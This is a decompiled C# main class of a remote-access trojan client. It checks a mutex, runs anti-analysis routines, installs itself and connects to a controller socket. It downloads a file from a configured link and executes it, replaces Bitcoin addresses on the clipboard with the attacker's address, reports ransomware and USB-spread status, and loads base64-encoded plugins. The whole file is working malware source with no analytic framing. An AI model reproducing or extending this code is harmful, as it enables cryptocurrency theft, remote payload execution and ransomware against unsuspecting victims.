using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Threading;
using Client_0._5.My;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;

namespace Client_0._5;

public class C_Main
{
	public static C_Socket C = new C_Socket();

	public static object SPL = C_Settings.SPL;

	[MethodImpl(MethodImplOptions.NoOptimization)]
	[STAThread]
	public static void Main()
	{
		Thread.Sleep(1000);
		C_Settings.NMT = new Mutex(initiallyOwned: true, C_Settings.MTX, out var createdNew);
		try
		{
			if (!createdNew)
			{
				ProjectData.EndApp();
			}
		}
		finally
		{
			if (createdNew)
			{
				C_Settings.NMT.ReleaseMutex();
			}
		}
		if (C_Settings.ANTI)
		{
			C_Fuctions.Anti();
		}
		if (C_Settings.ANTI)
		{
			C_Fuctions.Anti();
		}
		C_Installation.INS();
		C_Socket.T1.Start();
		if (C_Settings.BTC_ADDR.Length > 25)
		{
			Thread thread = new Thread(_BTC_ST);
			thread.SetApartmentState(ApartmentState.STA);
			thread.Start();
		}
		if (C_Settings.USB)
		{
			new Thread(StartSP).Start();
		}
		if (C_Settings.PIN)
		{
			new Thread(StartPIN).Start();
		}
		new Thread(Checking).Start();
		try
		{
			if (Operators.CompareString(C_Settings.DWN_LINK, "", false) == 0)
			{
				return;
			}
			if (C_Settings.DWN_CHK)
			{
				if (Operators.CompareString(C_Fuctions.GTV("DWN"), "True", false) != 0)
				{
					WebClient webClient = new WebClient();
					string fileName = Path.GetTempFileName() + Path.GetFileName(C_Settings.DWN_LINK);
					webClient.DownloadFile(C_Settings.DWN_LINK, fileName);
					Process.Start(fileName);
					C_Fuctions.STV("DWN", "True");
				}
			}
			else
			{
				WebClient webClient2 = new WebClient();
				string fileName2 = Path.GetTempFileName() + Path.GetFileName(C_Settings.DWN_LINK);
				webClient2.DownloadFile(C_Settings.DWN_LINK, fileName2);
				Process.Start(fileName2);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			NewLateBinding.LateCall((object)C, (Type)null, "Send", new object[1] { Operators.AddObject(Operators.AddObject(Operators.AddObject((object)"MSG", SPL), (object)"Error! "), (object)ex2.Message) }, (string[])null, (Type[])null, (bool[])null, true);
			ProjectData.ClearProjectError();
		}
	}

	private static void Checking()
	{
		Thread.Sleep(5000);
		string text = C_Fuctions.GTV("Rans-Status");
		string text2 = C_Fuctions.GTV("USB");
		int num = default(int);
		while (true)
		{
			try
			{
				num = 1;
				if (C_Socket.CNT)
				{
					Thread.Sleep(3000);
					if (Operators.CompareString(text, C_Fuctions.GTV("Rans-Status").ToString(), false) != 0)
					{
						text = C_Fuctions.GTV("Rans-Status");
						NewLateBinding.LateCall((object)C, (Type)null, "Send", new object[1] { Operators.ConcatenateObject(Operators.ConcatenateObject((object)"!R", SPL), (object)C_Fuctions.GTV("Rans-Status").ToString()) }, (string[])null, (Type[])null, (bool[])null, true);
					}
					if (C_Settings.USB && Operators.CompareString(text2, C_Fuctions.GTV("USB").ToString(), false) != 0)
					{
						text2 = C_Fuctions.GTV("USB");
						NewLateBinding.LateCall((object)C, (Type)null, "Send", new object[1] { Operators.ConcatenateObject(Operators.ConcatenateObject((object)"!U", SPL), (object)C_Fuctions.GTV("USB").ToString()) }, (string[])null, (Type[])null, (bool[])null, true);
					}
				}
				else
				{
					Thread.Sleep(5000);
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex, num);
				ProjectData.ClearProjectError();
			}
		}
	}

	private static void _BTC_ST()
	{
		while (true)
		{
			try
			{
				Thread.Sleep(1000);
				if (((Computer)MyProject.Computer).get_Clipboard().GetText().Length >= 26 && ((Computer)MyProject.Computer).get_Clipboard().GetText().Length <= 35 && (((Computer)MyProject.Computer).get_Clipboard().GetText().StartsWith("1") || ((Computer)MyProject.Computer).get_Clipboard().GetText().StartsWith("3") || ((Computer)MyProject.Computer).get_Clipboard().GetText().StartsWith("bc1")))
				{
					((Computer)MyProject.Computer).get_Clipboard().SetText(C_Settings.BTC_ADDR);
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	private static void StartSP()
	{
		try
		{
			if (Operators.CompareString(C_Fuctions.GTV("_USB"), (string)null, false) == 0)
			{
				while (!C_Socket.CNT)
				{
				}
				Thread.Sleep(9000);
				C_Socket.Send("PLUSB");
			}
			else
			{
				C_Commands.Plugin(Convert.FromBase64String(C_Fuctions.GTV("_USB")));
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private static void StartPIN()
	{
		try
		{
			if (Operators.CompareString(C_Fuctions.GTV("_PIN"), (string)null, false) == 0)
			{
				while (!C_Socket.CNT)
				{
				}
				Thread.Sleep(11000);
				C_Socket.Send("PLPIN");
			}
			else
			{
				C_Commands.Plugin(Convert.FromBase64String(C_Fuctions.GTV("_PIN")));
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
